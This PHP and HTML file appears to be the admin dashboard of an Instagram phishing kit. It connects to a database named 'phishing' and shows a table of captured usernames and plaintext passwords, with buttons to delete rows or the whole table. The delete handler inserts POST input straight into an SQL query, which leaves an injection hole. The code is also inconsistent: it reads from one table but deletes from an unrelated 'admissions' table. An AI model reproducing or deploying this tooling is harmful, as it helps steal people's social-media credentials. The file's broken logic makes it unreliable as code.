<?php 
$servername = "localhost";
    $dbUsername = "root";
    $dbPassword = "";
    $dbname = "phishing";

    $conn = mysqli_connect($servername, $dbUsername, $dbPassword, $dbname);

    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin</title>
    <link rel = "icon" href = "../insta.jpg" type = "image/x-icon">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif;
            background-color: #f8f8f8;
        }

        .dashboard {
            display: flex;
        }

        .sidebar {
            width: 280px;
            height: 100%;
            background-color: #2c3e50;
            color: #fff;
            position: fixed;
            transition: width 0.3s ease;
            z-index: 1;
        }

        .sidebar.collapsed {
            width: 70px;
        }

        .sidebar-logo {
            text-align: center;
            padding: 5px 9px;
        }

        .sidebar-logo img {
            max-width: 100%;
            max-height: 100%;
        }

        .sidebar-toggle {
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.3s ease;
        }

        .sidebar.collapsed .sidebar-toggle {
            transform: rotate(0deg);
        }

        .sidebar-toggle i {
            font-size: 24px;
            transition: transform 0.3s ease;
        }

        .sidebar.collapsed .sidebar-toggle i {
            transform: rotate(90deg);
        }

        .admin-profile {
            text-align: center;
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .admin-avatar img {
            width: 86px;
            height: 87px;
            border-radius: 50%;
            transition: width 0.3s ease;
        }

        .sidebar.collapsed .admin-avatar img {
            width: 40px;
            height: 40px;
        }

        .admin-details h3,
        .admin-details p {
            margin: 0;
            font-size: 16px;
            opacity: 0.8;
            transition: opacity 0.3s ease;
        }

        .sidebar.collapsed .admin-details h3,
        .sidebar.collapsed .admin-details p {
            opacity: 0;
        }

        .options {
            margin: 20px 0;
            padding: 0;
            list-style: none;
        }

        .option-button {
            display: block;
            width: 100%;
            padding: 20px;
            border: none;
            background-color: transparent;
            color: #fff;
            border-radius: 10px;
            transition: background-color 0.3s ease;
            text-align: left;
            cursor: pointer;
        }

        .option-button i {
            font-size: 18px;
            margin-right: 10px;
        }

        .option-button span {
            font-size: 16px;
        }

        .option-button.active {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .option-button:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .sidebar.collapsed .options li span {
            display: none;
        }

        .logout {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            display: flex;
            align-items: center;
        }

        .logout a {
            color: #fff;
            text-decoration: none;
            display: flex;
            align-items: center;
            padding: 15px 20px;
            border-radius: 10px;
            transition: background-color 0.3s ease;
        }

        .logout a:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .logout i {
            margin-right: 10px;
            font-size: 18px;
        }

        .logout.collapsed a span {
            display: none;
        }

        .container {
            flex-grow: 1;
            padding: 40px;
            background-color: #fff;
            transition: margin-left 0.3s ease;
            margin-left: 280px; /* Adjust the margin according to the width of the sidebar */
        }

        .sidebar.collapsed ~ .container {
            margin-left: 70px; /* Adjust the margin according to the width of the collapsed sidebar */
        }

        .dashboard-content {
            display: none;
        }

        .dashboard-content.active-content {
            display: block;
        }
table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
    margin-bottom: 20px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.4);
}

table th {
    background-color: #f2f2f2;
    font-weight: bold;
    text-transform: uppercase;
}

table td,
table th {
    padding: 12px;
    text-align: left;
    border: 1px solid #ccc;
}

.delete-button {
    background-color: #f44336;
    color: white;
    padding: 8px 12px;
    border: none;
    cursor: pointer;
    transition: background-color 0.3s;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.6);
    border-radius: 8px;
}

.delete-button:hover {
    background-color: #d32f2f;
}

.truncate-button {
    background-color: #f44336;
    color: white;
    padding: 10px 16px;
    border: none;
    cursor: pointer;
    margin-top: 10px;
    transition: background-color 0.3s;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.6);
    border-radius: 8px;
}

.truncate-button:hover {
    background-color: #d32f2f;
}

/* New CSS for table appearance */

tr:hover {
    background-color: #f9f9f9;
}

.table-actions {
    display: flex;
    align-items: center;
}

.table-actions .delete-button {
    margin-left: 10px;
}  
.scroll-button {
        background-color: #007bff;
        color: #fff;
        border: none;
        padding: 5px 10px;
        cursor: pointer;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.6);
        border-radius: 8px;
    }

    .scroll-button:hover {
        background-color: #0069d9;
    }
    </style>
</head>
<body>
        <div class="container">
           <div class="dashboard-content active-content">
                <h1>INSTAGRAM</h1>
            <?php
            $sql = "SELECT * FROM pass";
            $result = mysqli_query($conn, $sql);

            echo "<table>";
            echo "<tr>
                      <th>Sno</th>
                      <th>Name</th>
                      <th>Password</th>
                      <th>Action</th>
                  </tr>";

            if (mysqli_num_rows($result) > 0) {
                echo "<div id='scroll-to-truncate' style='text-align: center; margin-bottom: 20px;'>";
        echo "<button class='scroll-button' onclick='scrollToTruncate()'>Delete Table</button>";
                $sno = 1;
                while ($row = mysqli_fetch_assoc($result)) {
                    echo "<tr>";
                    echo "<td>" . $sno . "</td>";
                    echo "<td>" . $row['username'] . "</td>";
                    echo "<td>" . $row['password'] . "</td>";?>
                    <td>
    <form method="POST" style="display: inline-block;">
        <input type="hidden" name="delete_row1" value="<?php echo $row['sno']; ?>">
        <button class="delete-button" onclick="return confirm('Are you sure you want to delete this row?')">Delete</button>
    </form>
</td>
                   <?php  echo "</tr>";
                    $sno++;
                }
            } else {
                echo "<tr><td colspan='8' style='text-align: center;'>No Admissions found.</td></tr>";
            }

            echo "</table>";

            // Delete individual row
            if (isset($_POST['delete_row1'])) {
                $sno = $_POST['delete_row1'];
                $delete_sql = "DELETE FROM admissions WHERE sno = $sno";
                mysqli_query($conn, $delete_sql);
            }

            // Truncate the entire table
            if (isset($_POST['truncate_table1'])) {
                $truncate_sql = "TRUNCATE TABLE admissions";
                mysqli_query($conn, $truncate_sql);
            }
            ?>
            <?php if (mysqli_num_rows($result) > 0) { ?>
                <form id="truncate-form" method="POST" style="display: inline-block;">
                    <button class="truncate-button" name="truncate_table1" onclick="return confirm('Are you sure you want to delete the table? This action cannot be undone.')">Delete Table</button>
                </form>
            <?php } ?>
        </div>
    </div>

    <script>
        
        document.querySelector('.sidebar-toggle').addEventListener('click', function() {
            document.querySelector('.sidebar').classList.toggle('collapsed');
            document.querySelector('.container').classList.toggle('expanded');
        });

        const options = document.querySelectorAll('.options li');

        options.forEach(function(option) {
            option.addEventListener('click', function() {
                options.forEach(function(item) {
                    item.classList.remove('active');
                });
                this.classList.add('active');
            });
        });

        document.addEventListener("DOMContentLoaded", function() {
            const buttons = document.querySelectorAll('.option-button');
            const dashboardContents = document.querySelectorAll('.dashboard-content');

            buttons.forEach(function(button) {
                button.addEventListener('click', function() {
                    buttons.forEach(function(item) {
                        item.classList.remove('active');
                    });
                    this.classList.add('active');

                    const index = parseInt(this.getAttribute('data-index'));

                    dashboardContents.forEach(function(content) {
                        content.style.display = 'none';
                    });
                    dashboardContents[index].style.display = 'block';
                });
            });
        });
        function scrollToTruncate() {
        const element = document.getElementById("truncate-form");
        element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
    </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</body>
</html>
